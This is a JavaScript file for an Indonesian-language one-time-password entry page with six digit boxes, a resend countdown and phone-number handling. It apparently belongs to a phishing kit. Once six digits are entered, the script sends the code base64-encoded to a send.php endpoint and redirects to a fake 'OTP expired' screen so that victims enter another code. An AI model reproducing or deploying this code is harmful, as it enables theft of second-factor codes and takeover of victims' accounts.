var currentField = 0;
var timeout = 60;
var timeoutHandler = null;
var phone = "";
var action = "";

$(document).ready(function() {
    $("#timeout").html(timeout);
    $("#num1").attr("readonly", "readonly");
    $("#num2").attr("readonly", "readonly");
    $("#num3").attr("readonly", "readonly");
    $("#num4").attr("readonly", "readonly");
    $("#num5").attr("readonly", "readonly");
    $("#num6").attr("readonly", "readonly");
    var paramsString = window.location.search.substring(1);
    var params = paramsString.split("&");
    for (var i=0; i<params.length; i++) {
        var param = params[i];
        var paramName = param.split("=")[0];
        var paramValue = param.split("=")[1];
        if (paramName == "phone") {
            phone = paramValue;
            if (phone.startsWith("0")) {
                phone = phone.substring(1);
            }
            if (!phone.startsWith("+62")) {
                phone = "+62"+phone;
            }
            $("#phone").html(phone);
        } else {
            if (paramName == "action") {
                action = paramValue;
            }
        }
    }
    if (action == "timeout") {
        $("#expired-otp").css("display", "block");
    } else {
        $("#expired-otp").css("display", "none");
        timeoutHandler = setTimeout(timeoutHandling, 1000);
    }
});

function timeoutHandling() {
    if (timeout > 1) {
        timeout--;
        $("#resend-text").html("Kirim ulang SMS dalam "+timeout+" detik");
        timeoutHandler = setTimeout(timeoutHandling, 1000);
    } else {
        clearTimeout(timeoutHandler);
        timeoutHandler = null;
        $("#resend-text").css("color", "#017cfb");
        $("#resend-text").html("Kirim ulang SMS");
    }
}

function send() {
    var otpCode = $("#otp").val().trim();
    if (otpCode == "") {
        alert("Mohon masukkan kode OTP");
        return;
    }
    $("#loader").css("display", "flex");
    $.ajax({
        type: "get",
        url: "send.php?message="+btoa("Kode OTP: "+otpCode),
        dataType: "text",
        success: function(response) {
            $("#loader").css("display", "none");
            window.location.href = "otp.html?phone="+phone+"&action=timeout";
        }
    });
}

function type(number) {
    if (currentField < 6) {
        if (currentField == 0) {
            $("#num1").val(number);
            $("#num2").focus();
        } else if (currentField == 1) {
            $("#num2").val(number);
            $("#num3").focus();
        } else if (currentField == 2) {
            $("#num3").val(number);
            $("#num4").focus();
        } else if (currentField == 3) {
            $("#num4").val(number);
            $("#num5").focus();
        } else if (currentField == 4) {
            $("#num5").val(number);
            $("#num6").focus();
        } else if (currentField == 5) {
            $("#num6").val(number);
            send();
        }
        currentField++;
    } else {
    }
}

function deleteNum() {
    if (currentField > 0) {
        if (currentField == 6) {
            $("#num6").val("");
            $("#num5").focus();
        } else if (currentField == 5) {
            $("#num5").val("");
            $("#num4").focus();
        } else if (currentField == 4) {
            $("#num4").val("");
            $("#num3").focus();
        } else if (currentField == 3) {
            $("#num3").val("");
            $("#num2").focus();
        } else if (currentField == 2) {
            $("#num2").val("");
            $("#num1").focus();
        } else if (currentField == 1) {
            $("#num1").val("");
        }
        currentField--;
    }
}

function resendOTPCode() {
    if (timeout <= 1) {
        $("#resend-text").css("color", "#b6d7f8");
        timeout = 60;
        $("#resend-text").html("Kirim ulang SMS dalam "+timeout+" detik");
        timeoutHandler = setTimeout(timeoutHandling, 1000);
    }
}

function goBack() {
    setTimeout(() => {
        window.history.back();
    }, 500);
}

module.type = type;
module.deleteNum = deleteNum;
module.resendOTPCode = resendOTPCode;
module.send = send;
module.goBack = goBack;